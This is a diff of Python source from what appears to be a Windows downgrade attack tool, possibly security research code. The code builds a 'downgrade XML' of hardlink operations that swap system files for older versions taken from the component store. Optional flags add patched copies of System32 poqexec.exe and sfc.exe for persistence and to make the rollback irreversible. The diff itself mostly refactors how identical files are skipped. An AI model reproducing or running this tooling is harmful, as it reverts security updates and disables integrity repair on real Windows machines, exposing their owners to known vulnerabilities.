@@ -28,6 +28,7 @@ class UpdateFile:
         self.destination_path_obj = Path(destination_path)
         self.should_retrieve_oldest = False
         self.is_oldest_retrieved = False
+        self.skip_update = False
 
         if not self.source_path_obj.exists:
             self.should_retrieve_oldest = True
@@ -35,10 +36,13 @@ class UpdateFile:
         if not self.destination_path_obj.exists:
             raise FileNotFoundError(f"The file to update {self.destination_path_obj.full_path} does not exist")
 
-    def validate(self):
+    def verify_no_errors_or_raise(self):
         if self.should_retrieve_oldest and not self.is_oldest_retrieved:
             raise Exception("Oldest destination file retrieval failed. "
                             f"Destination {self.destination_path_obj.name} may not be part of the component store")
+
+    def is_src_and_dst_equal(self) -> bool:
+        return is_file_contents_equal(self.source_path_obj.full_path, self.destination_path_obj.full_path)
 
     def to_hardlink_dict(self) -> Dict[str, str]:
         return {"source": self.source_path_obj.nt_path, "destination": self.destination_path_obj.nt_path}
@@ -94,6 +98,7 @@ def parse_config_xml(config_file_path: str) -> List[UpdateFile]:
     return update_files
 
 
+# TODO: This should be part of UpdateFile I think
 def retrieve_oldest_file_for_update_file(component: Path, update_file: UpdateFile) -> None:
     updated_file_path = f"{component.full_path}\\{update_file.destination_path_obj.name}"
     reverse_diff_file_path = f"{component.full_path}\\r\\{update_file.destination_path_obj.name}"
@@ -133,7 +138,10 @@ def retrieve_oldest_files_for_update_files(update_files: List[UpdateFile]) -> No
             retrieve_oldest_file_for_update_file(component, update_file)
 
     for update_file in update_files:
-        update_file.validate()
+        update_file.verify_no_errors_or_raise()
+        if update_file.is_src_and_dst_equal():
+            update_file.skip_update = True
+            logger.info(f"Will skip update of {update_file.destination_path_obj.name}, source and destination equal")
 
     end_time = time.time()
     elapsed_time = end_time - start_time
@@ -145,17 +153,13 @@ def craft_downgrade_xml(update_files: List[UpdateFile]) -> ET.ElementTree:
     poq_element = find_child_elements_by_match(downgrade_xml, "./POQ")[0]  # Post reboot POQ is always at index 0
 
     for update_file in update_files:
-
-        # Let's make sure we do not update files that are the same
-        if is_file_contents_equal(update_file.source_path_obj.full_path, update_file.destination_path_obj.full_path):
-            logger.info(f"Skipping update of {update_file.destination_path_obj.name},"
-                        f" source and destination are the same")
+        if update_file.skip_update:
             continue
 
         hardlink_dict = update_file.to_hardlink_dict()
         hardlink_element = create_element("HardlinkFile", hardlink_dict)
         append_child_element(poq_element, hardlink_element)
-        logger.info(f"\t\t{update_file.destination_path_obj.full_path} -> {update_file.source_path_obj.full_path}")
+        logger.info(f"{update_file.destination_path_obj.full_path} -> {update_file.source_path_obj.full_path}")
 
     return downgrade_xml
 
@@ -180,17 +184,19 @@ def main() -> None:
     if args.invisible:
         raise NotImplementedError("Not implemented yet")
 
+    # TODO: Verify the patched file exists, else we just get its base
     if args.persistent:
-        patched_poqexec_path_obj = Path(f"{cwd}\\resources\\PoqExec\\poqexec.exe")
-        poqexec_path_obj = Path("C:\\Windows\\System32\\poqexec.exe")
-        poqexec_update_file_obj = UpdateFile(patched_poqexec_path_obj, poqexec_path_obj)
+        patched_poqexec_path = f"{cwd}\\resources\\PoqExec\\poqexec.exe"
+        poqexec_path = "C:\\Windows\\System32\\poqexec.exe"
+        poqexec_update_file_obj = UpdateFile(patched_poqexec_path, poqexec_path)
         update_files.append(poqexec_update_file_obj)
         logger.info("Added patched PoqExec to update files for persistence")
 
+    # TODO: Verify the patched file exists, else we just get its base
     if args.irreversible:
-        patched_sfc_path_obj = Path(f"{cwd}\\resources\\SFC\\sfc.exe")
-        sfc_path_obj = Path("C:\\Windows\\System32\\sfc.exe")
-        sfc_update_file_obj = UpdateFile(patched_sfc_path_obj, sfc_path_obj)
+        patched_sfc_path = f"{cwd}\\resources\\SFC\\sfc.exe"
+        sfc_path = "C:\\Windows\\System32\\sfc.exe"
+        sfc_update_file_obj = UpdateFile(patched_sfc_path, sfc_path)
         update_files.append(sfc_update_file_obj)
         logger.info("Added patched SFC to update files for irreversible")
 
